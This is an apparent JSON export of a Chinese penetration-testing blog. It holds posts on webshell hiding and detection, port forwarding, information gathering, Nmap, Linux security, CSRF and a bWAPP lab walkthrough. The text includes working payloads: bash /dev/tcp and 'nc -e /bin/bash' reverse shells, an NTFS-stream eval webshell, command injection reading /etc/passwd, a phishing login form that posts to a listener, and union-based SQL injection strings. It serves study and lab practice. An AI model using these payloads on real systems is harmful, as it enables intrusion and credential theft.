system($_SERVER(&#x27;HTTP_USER_AGENT&#x27;))&gt; 这种方式会在服务器日志中留下痕迹，很容易被识别 动态函数执行，把一个函数名当成一个字符串传递给一个变量，然后去执行(类似的：把执行命令分别放在一个文件中，然后用另一个文件去包括) 1&lt;?php $a=&quot;phpinfo&quot;; $a()&gt; 使用各种编码比如hex、base64等，而且目录层数越深越好，尽量把上传的webshell放到四五级目录下 webshell里面尽量不要用类似eval，exec,system,assert这样敏感的特征，因为awk很容易检测出来。可以自己写一些自定义函数，或者使用 call_user_func这样的回调函数来构造webshell。 在win sever环境下，使用windows中的隐藏文件 — NTFS文件流（ADS） 1echo ~&lt;?php @eval($_POST[&#x27;chaper&#x27;]);?~&gt; &gt; index.php:hidden.jpg 这样就生成了一个不可见的文件，常规的文件管理器，type命令，dir命令都不能发现这个index.php:hidden.jpg,这个文件只能通过命令notepad index.php:hidden.jpg打开。 webshell检测1.基于webshell的特征检测常见的webshelll函数 存在系统调用的命令执行函数，如eval、system、cmd_shell、assert等； 存在系统调用的文件操作函数，如fopen、fwrite、readdir等 存在数据库操作函数，调用系统自身的存储过程来连接数据库操作； 这种基于特征值、危险函数的特征检测只能查找已知的webshell，无法查找0day型的webshell，而且误报率比较高。对于大型的网站，可以使用强弱特征，即把特征分为强弱两种特征，强特征命中则是webshell，弱特征由人工去判断 2.基于流量特征的webshell检测webshell通信是HTTP协议。只要我们把webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好。webshell如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。如果黑客反向连接的话，Agent和IDS都可以检测到。Webshell总有一个HTTP请求，如果在网络层监控HTTP，并且检测到有人访问了一个从没反问过的文件，而且返回了200，则很容易定位到webshell，这便是http异常模型检测，就和检测文件变化一样，如果非管理员新增文件，则说明被人入侵了。 比如中国菜刀的流量特征就很明显 3. 日志检测使用Webshell一般不会在系统日志中留下记录，但是会在网站的web日志中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，这是：HTTP异常请求模型检测。例如：一个平时是GET的请求突然有了POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。 ebshell的访问特征(主要特征) 少量ip对其发起访问 总的访问次数少 优点：采用了一定数据分析的方式，网站的访问量达到一定量级时这种检测方法的结果具有较大参考价值。 缺点：存在一定误报，对于大量的访问日志，检测工具的处理能力和效率会比较低。 webshell防御 建议用户通过ftp来上传、维护网页，尽量不安装asp，php的上传程序。 对asp，php上传程序的调用一定要进行身份认证，并只允许信任的人使用上传程序。 利用白名单上传文件，上传目录权限遵循最小权限原则。","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"渗透之端口转发","slug":"渗透之端口转发","date":"2021-03-12T08:01:51.000Z","updated":"2021-07-12T02:53:21.895Z","comments":true,"path":"2021/03/12/渗透之端口转发/","link":"","permalink":"http://yejuns.github.io/2021/03/12/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/","excerpt":"","text":"端口转发在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题： 对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙 对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口 常用的方法有 nc、lcx、socks、bash反弹、MSF后门反弹、frp nc端口转发背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 在192.168.50.2上开启8000端口nc -l 8000 在192.168.50.2上实现9000端口转发cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo 在192.168.50.1上连接192.168.50.2的9000端口nc -vn 192.168.50.2 9000 Shell命令实现端口转发 部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1 1234ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost # 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost# 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口. 案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可 ssh -CfNg -L 6300:127.0.0.1:80 userc@C ssh -CfNg -R 80:127.0.0.1:6300 usera@A 服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例: tcpdump -s 0 -i lo port 6300","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"}]},{"title":"web安全之信息收集","slug":"wen安全之信息收集","date":"2021-03-11T08:01:51.000Z","updated":"2021-07-03T10:50:27.208Z","comments":true,"path":"2021/03/11/wen安全之信息收集/","link":"","permalink":"http://yejuns.github.io/2021/03/11/wen%E5%AE%89%E5%85%A8%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"","text":"1.信息收集在web渗透中，信息收集的深度与广度决定了后续渗透测试的成功与否，所以我们需要尽可能的收集目标的所有信息；收集方向大概分为以下几点： 有无CDN 有无WAF 组织信息 搭建环境 站点架构 网站源码获取 域名信息 有无APK 有无微信小程序 有无PC应用 自动批量信息收集 其它信息收集 2. 信息收集思路 拿到渗透测试目标后，首先判断目标域名是否存在CDN，如果存在，需要先绕过CDN获取真实IP后再进行下一步，防止后续渗透测试全部测试到CDN节点上。 如何绕过CDN? 测试目标是否存在WAF，可以通过工具识别（存在误判）或者通过人工识别（根据拦截页面的图片判断）的方式判断是否存在WAF，什么类型的WAF，然后针对性的进行绕过. 12345# Nmap有一些脚本可以来测试WAF中是否存在于所有检测到的HTTP端口nmap -sT -sV-p 80,443,8080,8081 --script=http-waf-detect 192.168.56.11nmap -p80,443 --script=http-waf-fingerprint www.example.com# SQLMap中自带的WAF识别模块可以识别出WAF的种类，但是如果所安装的WAF并没有什么特征，SQLMap就只能识别出类型是Generic。sqlmap.py -u “url” –identify-waf –batch 先从组织信息这块入手，获取到网站和管理员的一些信息（QQ,手机号，邮箱等等…），通过whois，网站备案信息获取更多目标；后期需要爆破时可以通过获取到的联系方式针对性的生成字典，提高爆破成功率；也可以利用联系方式在Github等托管平台搜索泄露的敏感信息 针对网站搭建环境需要收集目标操作系统是Windows还是Linux?具体内核版本是什么?开放了哪些端口和服务？后续可以针对性的进行测试(例如可以使用公开的缓冲区溢出，RCE，弱口令等安全漏洞进行测试)；收集到目标的中间件版本信息，数据库版本信息后，一样可以寻找相关安全漏洞进行测试(例如中间件解析漏洞,RCE,远程代码执行等等，数据库弱口令,未授权访问等等)。获取的Web接口（短信接口，支付接口等等）也可以作为渗透测试的一个突破口。了解网站使用的脚本语言也很重要，由于各种脚本语言的特性与机制，其产生的安全问题也有很大差异（例如PHP站点中经常出现SQL注入，文本包含等安全问题，而Java站点中则经常出现反序列化的安全漏洞） 网站的搭建架构也是不可忽视的部分，很多站点在同一台服务器上经常使用端口，目录，子域名等方式区分站点，所以我们渗透测试时需要对开放端口，网站目录，子域名等信息都要收集（在进行目录扫描时除了对网站域名进行扫描，也建议对网站IP进行扫描；例如某个网站 http://192.168.1.1 站点的根目录是www，其下域名test.com 的根目录是www/test.com 。如果在网站根目录www下存在test.com的源码备份，我们扫描时如果只针对域名进行目录扫描，是无法获取到源码备份的，只有通过对IP站点进行目录扫描才能发现test.com的源码备份）。 在渗透测试时，能获取到网站源码往往能达到事半功倍的效果。如果我们知道目标站点使用的是CMS搭建，那么我们就可以寻找该CMS公开漏洞进行测试；如果使用的是框架开发，那么也可以搜索该框架漏洞进行测试；或者我们可以利用获取的网站源码进行本地搭建测试寻找安全漏洞，也可以通过代码审计的方式挖掘0day。 如何获取网站源码：可以通过扫描网站目录获取源码备份；CMS可以直接去CMS官网下载；框架开发的站点可以去官网下载框架本地安装；某些正规源码（商城，博客，企业等等）可以通过搜索引擎在一些正规源码站获取，违法源码（BC，棋牌，私服，杀猪盘等等）也可以通过搜索引擎在一些黑源码站进行获取；某些站点可能使用了Github，Gitee等托管平台托管，也可能存在源码泄露的安全问题。 针对域名的收集可以通过网站备案，Whois查询获取更多目标（Whois反查注册人，电话，邮箱等等）；通过IP地址反查绑定的域名信息；也可以通过搜索引擎或者在线平台获取目标子域名或利用工具进行子域名枚举；也可以利用空间引擎寻找同模板站点，在同模板站点获取源码后进行代码审计挖掘到漏洞后在转向测试目标；或者通过搜索域名中的关键字（例如 baidu.com 中的baidu，在搜索引擎或域名注册商处查询类似域名 baidu.cn，baidu.net等等)。或者对旁站C段进行信息收集，从旁站或C段入手，间接的拿下目标站点。 假如目标只是一个单纯的APK下载页或PC程序下载页，或者是一个微信公众号，那么我们可以通过对这些APK&amp;微信小程序&amp;PC应用进行抓包或者逆向获取其中的URL和IP地址，转向Web渗透测试的思路。 在收集测试目标的Web目录，备份文件等信息时，除了使用Web目录文件扫描，还可以进行Fuzz，尽可能的收集更多信息；而后期在SQL注入，文件上传，XSS等漏洞挖掘或绕Waf时也可以使用Fuzz进行测试。","categories":[],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"http://yejuns.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}]},{"title":"web安全之Nmap使用","slug":"NMap使用","date":"2021-03-03T13:21:21.000Z","updated":"2021-07-07T15:49:18.403Z","comments":true,"path":"2021/03/03/NMap使用/","link":"","permalink":"http://yejuns.github.io/2021/03/03/NMap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"NmapNmap是被专业人员广泛使用的一款功能全面的端口扫描工具 安装kali上已经自带，windows上去官网下载相关的安装包，centos就直接 yum install nmap 简单入门刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 nmap your-ip（域名） 就可以扫描出其对外开放的服务。 123456789101112nmap 192.168.31.13#基本格式，会扫描该主机的所有端口nmap -p 8080 192.168.31.13# 判断指定ip是否开放指定端口 nmap -p 22,21,80 192.168.31.13nmap -p 22,21,80 192.168.31.1-253# 增加端口和网段 nmap 192.168.31.1/24# 扫描整个子网的端口，这个过程可能会比较久 进阶Nmap扫描相关端口后，会显示出各个端口的状态，一共有6种 Open，开放状态（当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务） Closed，关闭状态（TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口） Filtered(过滤的)，由于报文无法到达指定的端口，nmap不能确定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致 Unfiltered(未被过滤的), 虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。 Open|filtered Nmap认为指定端口处于开放状态或过滤状态，这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型 Closed|filtered Nmap认为指定端口处于开放状态或未过滤状态， 以下是一些例子 123456789101112131415161718192021nmap -O 192.168.31.13 -p 8080#操作系统检测（-O）nmap -Pn 80 192.168.31.13# 禁用主机检测（-Pn）,如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机。这将使得Nmap无法进行进一步检测，禁用Nmap的主机检测功能后。Nmap会认为目标主机已经开机并进行全套的检测工作nmap -A 192.168.31.13 -p 8080# 强力检测选项（-A），Nmap将检测目标主机的下述信息# 服务版本识别（-sV）；操作系统识别（-O）；脚本扫描（-sC）nmap -sT 192.168.31.1# TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来nmap -sS 192.168.31.1# SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式namp -sN 192.168.31.1namp -sF 192.168.31.1#TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。-O x.x.x.x #检测目标主机系统 UDP扫描nmap -sU 192.168.1.1 Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着 可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必 定会超过18个小时。 优化方法主要是: 进行并发的UDP扫描； 优先扫描常用端口； 在防火墙后面扫描； 启用–host-timeout选项以跳过响应过慢的主机。 假如我们需要找到目标主机开放了哪些 UDP端口。为提高扫描速度，我们仅扫描 53端口 （DNS）和161端口（SNMP） 使用命令 nmap -sU 192.168.56.103 -p 53,161 目标端口选项默认情况下，Nmap将从每个协议的常用端口中随机选择1000个端口进行扫描。其nmapservices文件对端口的命中率进行了排名。 1234567-p端口范围：只扫描指定的端口。扫描1〜1024号端口，可设定该选项为–p 1-1024。扫描1 〜65535端口时，可使用-p-选项。-F（快速扫描）：将仅扫描100 个常用端口。-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。-top-ports &lt;1 or=&quot;&quot; greater=&quot;&quot;&gt;：扫描nmap-services 里排名前N的端口。 Nmap还提供了脚本引擎功能（Nmap Scripting Engine，NSE） 12nmap -p1-65000 -sV 192.168.1.1#扫描目标ip的1-65000端口，并进行服务版本识别 NC由于Nmap中提供了Ncat功能，Ncat包含NetCat的所有功能 123456nc -l -p 80 #监听本机的TCP80端口nc -nvv 192.168.x.x 80 #连到192.168.x.x的TCP80端口nc -e /bin/bash 192.168.0.1 33# 绑定到192.168.0.1的33端口，并反弹一个自己的shell到远程主机","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Linux 中的安全模型","slug":"Linux 中的安全模型","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T05:48:45.271Z","comments":true,"path":"2020/12/31/Linux 中的安全模型/","link":"","permalink":"http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"Linux 的构成Linux 可以分为内核层和用户层。用户层通过内核层提供的操作接口，来执行各类任务 内核层提供的权限划分、进程隔离和内存保护的安全功能，是用户层的安全基础。一旦内核 安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存。 但作为使用者，对于内核层我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新。我们需要关注的是用户层的安全。 用户层安全在 Linux 中，用户层的所有操作，都可以抽象为“主体 -&gt; 请求 -&gt; 客体”这么一个流程。 比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。 在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。Linux 用户层则需要确保权限的正确配置 Linux中的认证机制Linux是一个多用户操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有 2个比较关键的文件：/etc/passwd和/etc/shadow /etc/passwd是全局可读的，不具备保密性。因此，/etc/passwd不会直接存储密码，而是用x来进行占位。那实际的用户密码信息，就会存储到仅ROOT可读的/etc/shadow中。 在/etc/shadow中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之类的密码管理策略。我们可以通过Chage 命令来对密码管理策略进行修改,如 12chage -M 60 ye# 强制用户ye在 60 天内必须对密码进行修改 因为认证这个功能是由Linux内核来提供的，所以在用户层，我们需要关心的,就是弱密码导致的身份信息泄漏。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过使用已知的弱密码库，来对 Linux 中的弱密码进行检测 Linux 中的授权机制Linux对目录和文件除了r,w,x3种权限外，还提供了一些额外的权限标签，来进行更细粒度地权限控制 Linux 提供了文件属性的概念，来对文件设置更多的保护。通过chattr +i /etc/passwd可以防止文件被任何用户修改 Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如chmod +t /tmp可以阻止删除/tmp目录下其他用户的文件 要解决权限问题，我们就要实践最小权限原则。 Linux中最普遍的问题，就是滥用Root，很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境 但是，在 ROOT 的 Shell 环境中，启动的所有进程也都具备ROOT权限。如果启动的是一个立即返回的进程，如CAT,不会有太多问题，但如果是一个长期 运行的进程，就很容易产生权限的滥用。 比如，当你以ROOT的身份启动Redis或者 MySQL 时，如果这时有其他用户 连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。 谨记“最小权限”原则。也就是说，我们根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。 我们不需要自己去配置这些权限，而是常常使用一些已知的工具，来实现“最小权限”启动长驻进程的功能。 比如说，我们可以通过 mysqld 启动 MySQL 服务时，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT下建立守护进程(可以理解为服务)。 类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。","categories":[],"tags":[{"name":"Linux安全","slug":"Linux安全","permalink":"http://yejuns.github.io/tags/Linux%E5%AE%89%E5%85%A8/"}]},{"title":"burpsuite使用","slug":"burpsuite使用","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T00:21:11.994Z","comments":true,"path":"2020/12/31/burpsuite使用/","link":"","permalink":"http://yejuns.github.io/2020/12/31/burpsuite%E4%BD%BF%E7%94%A8/","excerpt":"","text":"","categories":[],"tags":[{"name":"测试","slug":"测试","permalink":"http://yejuns.github.io/tags/%E6%B5%8B%E8%AF%95/"}]},{"title":"bwapp学习笔记-A1 Injection","slug":"bwapp-靶场题解思路A1","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-02T08:37:23.091Z","comments":true,"path":"2020/12/31/bwapp-靶场题解思路A1/","link":"","permalink":"http://yejuns.github.io/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/","excerpt":"","text":"网络上相关的笔记也很多，但有些地方感觉还是得说得更清楚一些 HTML Injection-Reflection(Get)low level对于输入的数据没有验证，直接显示在页面上，因此可以注入XSS 123// 注入的代码&lt;script&gt;alter(124)&lt;/script&gt;&lt;a href = &quot;http://www.baidu.com&quot;&gt;click here&lt;/a&gt; medium level在源码中做了简单的字符替换（源码如下） 12345// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities$input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);# 对转换后的data还要进行url解码$input = urldecode($input); 因为对’&lt;’和’&gt;’都进行了html编码，所以在注入时可先对数据进行url编码，消除’&lt;’和’&gt;’，因为后面会对输入的数据进行url解码，所以可以注入成功。 123// 对 &lt; &gt; 经过url编码%3cscript%3ealter(124)%3c%2fscript%3e%3ca href = &quot;http://www.baidu.com&quot;%3eclick here %3c/a%3e high level使用htmlspecialchars对数据进行编码，并且制定了字符编码方式为utf-8，避免了被宽字节注入，所以很难被绕过，源码如下 123456function xss_check_3($data, $encoding = &quot;UTF-8&quot;)&#123; // htmlspecialchars - converts special characters to HTML entities return htmlspecialchars($data, ENT_QUOTES, $encoding);&#125; 需要注意的是，同样是对输入的数据进行html编码，medium为什么可以使用url编码被绕过，而high不能被绕过。一个重要的原因是medium中对输入的数据还进行了url解码，所以注入的数据可以正常解析，从而实现攻击。 额外补充 htmlentities：将所有的字符进行html编码； htmlspecialchars：只对”&amp;,”,’,&lt;,&gt;”进行html编码 使用htmlspecialchars后，想要对其进行绕过，一种可行的方法是对注入的数据进行uft-7编码，然后将页面的编码方式也设为uft-7。 HTML Injection-Reflection(POST)与get类似 HTML Injection - Reflected (URL)主要的处理函数如下： 123456789101112case &quot;0&quot; : // $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . urldecode($_SERVER[&quot;REQUEST_URI&quot;]); $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; break; case &quot;1&quot; : $url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; break; case &quot;2&quot; : $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); break; low level使用burpsuit对发起的请求进行抓包，重新构造请求，就可以进行注入。 medium level旧的IE浏览器不会对‘&lt;’ 和 ‘&gt;’进行编码，所以可以进行DOM XSS注入 high level无法绕过(对输入进行了htmlentities) HTML Injection - Stored (Blog)low level因为有输入的文本框，先考虑是否存在存储型XSS 初次以外，我们还可以注入一个iframe进行钓鱼,比如在输入框中输入： 12345678910111213141516div class=&quot;test_code&quot;&gt;test&lt;/div&gt;&lt;div style=&quot;position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;&quot;&gt;Please Login Here To Proceed:&lt;form name=&quot;login&quot; action=&quot;http://127.0.0.1:1234/hacked.html&quot; method=&quot;post&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;/&gt;&lt;/form&gt;&lt;/div&gt; 然后在127.0.0.1的主机上监听1234端口，比如我就使用nc监听了相关端口，nc -lvnp 1234,最后就可以得到用户的输入 medium level无法绕过 high level无法绕过 iFrame Injectionlow level根据get请求可知，直接修改ParamUrl参数即可， 原始URL：http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250 漏洞URL：http://127.0.0.1/iframei.php?ParamUrl=http://www.baidu.com&amp;ParamWidth=250&amp;ParamHeight=250 medium level对传入的URL使用addslashes函数进行处理，只会对&#39; &quot; \\ null转义，因此依然可以绕过,只需要在ParamHeight后面闭合即可，（或者使用 iframe 标签的 srcdoc 属性替换“src”属性的内容，达到更好的注入效果） 漏洞URL：ParamHeight=250&quot;&gt;&lt;/iframe&gt;&lt;h2&gt;hello&lt;/h2&gt;&lt;!-- 漏洞URL：http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250&quot; srcdoc&gt;&lt;/iframe&gt;&lt;iframe src=https://www.baidu.com width=800 height=1000&gt;&quot; high level无法绕过 LDAP InjectionLDAP注入攻击和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。 使用得最广泛的LDAP：ADAM和OpenLDAP。 OS Command Injectionlow使用了shell_exec()方法，且没有过滤，可用命令 www.nsa.gov; cat /etc/passwd www.nsa.gov &amp; uname -a www.nsa.gov | ps -ef 这种情况下，甚至可以获得一个反弹shell，www.nsa.gov ; nc -vlp 1234 -e /bin/bash medium源码中对‘;’ ‘&amp;’进行了过滤，但仍然可以使用| high源码中使用了escapeshellcmd函数，确保用户只执行一个命令 OS Command Injection-Blind盲注的思想在于根据请求的时间，来判断命令是否运行成功。 PHP Code Injectionlow根据首页可以推测，肯定是通过url进行php相关脚本的注入。 原始url：http://192.168.50.151/phpi.php 恶意url：http://192.168.50.151/phpi.php?message=phpinfo() 造成代码注入的原因是没有对输入进行过滤，源码如下 1&lt;?php @eval (&quot;echo &quot; . $_REQUEST[&quot;message&quot;] . &quot;;&quot;) medium &amp; high无法绕过，对输入进行了转义，源码如下： 1&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt; SQL Injection (GET/Search)low 对于sql注入，我们首先要找到注入点 然后确定字段数 121&#x27; order by 8#1&#x27; order by 7# 确定可注入的字段的位置,构造相关的字段 121&#x27; union select 1,2,3,4,5,6,7#1&#x27; union select 1,database(),version(),user(),5,6,7# 使用同样的构造方法可以确认出表名、数据库名,用户名 1231&#x27; union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables#1&#x27; union select 1,login,Password,email,secret,6,7 from users# 也可以直接用sqlmap跑出来 sqlmap -u &quot;http://192.168.50.151/sqli_1.php?title=aaa&amp;action=search&quot; medium对输入的数据进行了addslashes处理，addslashes只会对&#39; &quot; \\进行转义操作，绕过方式 宽字节注入（数据库默认是latin1编码，要想注入成功，需要将编码改为GBK） 编码解码导致的绕过（原因是字符串在带入查询前，被做了一些编码解码操作而没有再做一次过滤） 后面的大致思路都差不多","categories":[],"tags":[{"name":"靶场","slug":"靶场","permalink":"http://yejuns.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"web安全之CSRF","slug":"web安全之CSRF","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-02T08:40:17.090Z","comments":true,"path":"2020/12/31/web安全之CSRF/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/","excerpt":"","text":"CSRF数据包的中Cookie 的值是浏览器从本地存储中取出，并自动填充到数据包中。 如果攻击者控制了用户浏览器并且窃取了cookie。 浏览器会自动完成Cookie 的填充，目标网站会误认为该数据包就是管理员发送的，会以管理员的权限进行相关的操作。 CSRF的原因HTTP 是一种无状态协议，即服务器不会保留与客户交易时的状态。 用户A 在很短的时间间隔内向Web服务器发送了两次同样的请求，服务器并不会因为已经响应了该请求一次就不对第二次请求进行响应，因为服务器并不知道已经响应过一次该请求。 假设用户在网站A的某一个页面上已经完成了登录操作，当在该网站的另一个页面上执行的操作需要验证用户登录的时候任然需要用户再次登录，因为HTTP 并不知道你已经登录，它不会维持你的登录状态。 为了让服务器能够记住用户引入了Cookie 机制。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"js原型链","slug":"js原型链","date":"2020-12-31T08:01:51.000Z","updated":"2021-06-01T03:21:56.544Z","comments":true,"path":"2020/12/31/js原型链/","link":"","permalink":"http://yejuns.github.io/2020/12/31/js%E5%8E%9F%E5%9E%8B%E9%93%BE/","excerpt":"","text":"重点原型链最重要的是记住这三点 __proto__、 constructor 属性是对象所独有的； prototype 属性是函数独有的； 上面说过js中函数也是对象的一种，那么函数同样也有属性__proto__、 constructor； 也就是说，普通对象（比如 {a:1}）没有prototype属性—不明白 前置知识 想要弄清楚原型和原型链，这几个属性必须要搞清楚，__proto__ 、prototype 、 constructor。 其次你要知道js中对象和函数的关系，函数其实是对象的一种。 最后你要知道函数、构造函数的区别，任何函数都可以作为构造函数，但是并不能将任意函数叫做构造函数，只有当一个函数通过new关键字调用的时候才可以成为构造函数。如：1234567var Parent = function()&#123;&#125;//定义一个函数，那它只是一个普通的函数，下面我们让这个函数变得不普通var p1 = new Parent();//这时这个Parent就不是普通的函数了，它现在是一个构造函数。因为通过new关键字调用了它//创建了一个Parent构造函数的实例 p1 prototype属性它是函数独有的属性，从一个函数指向另一个对象，代表这个对象是这个函数的原型对象，这个对象也是当前函数所创建的实例的原型对象。prototype设计之初就是为了实现继承，让由特定函数创建的所有实例共享属性和方法，也可以说是让某一个构造函数实例化的所有对象可以找到公共的方法和属性。有了prototype我们不需要为每一个实例创建重复的属性方法，而是将属性方法创建在构造函数的原型对象上（prototype）。那些不需要共享的才创建在构造函数中。继续引用上面的代码，当我们想为通过Parent实例化的所有实例添加一个共享的属性时， 1Parent.prototype.name &#x3D; &quot;我是原型属性，所有实例都可以读取到我&quot;; 这就是原型属性，当然也可以添加原型方法。那问题来了，p1怎么知道他的原型对象上有这个方法呢，往下看↓↓↓ proto属性1__proto__属性相当于指向prototype唯一的指针 __proto__ 属性告诉我们一个对象的原型是什么. 